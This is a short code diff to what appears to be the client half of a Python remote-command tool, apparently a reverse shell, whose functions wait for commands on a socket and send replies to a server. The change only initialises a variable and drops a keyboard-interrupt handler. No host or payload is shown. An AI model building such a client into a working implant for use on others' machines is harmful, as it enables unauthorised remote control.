@@ -5,6 +5,7 @@ import sys
 
 #Function to Receive Inbound Messages and Return Them to the Session Handler
 def inbound():
+    message = ''
     print('[+] Awaiting command...')
     while True:
         try:
@@ -12,9 +13,6 @@ def inbound():
             return(message)
         except Exception:
             sock.close()
-        except KeyboardInterrupt:
-            print('[!] Keyboard interrupt issued.')
-            sock.close
 
 #Function to Send Responses to the Server
 def outbound(message):
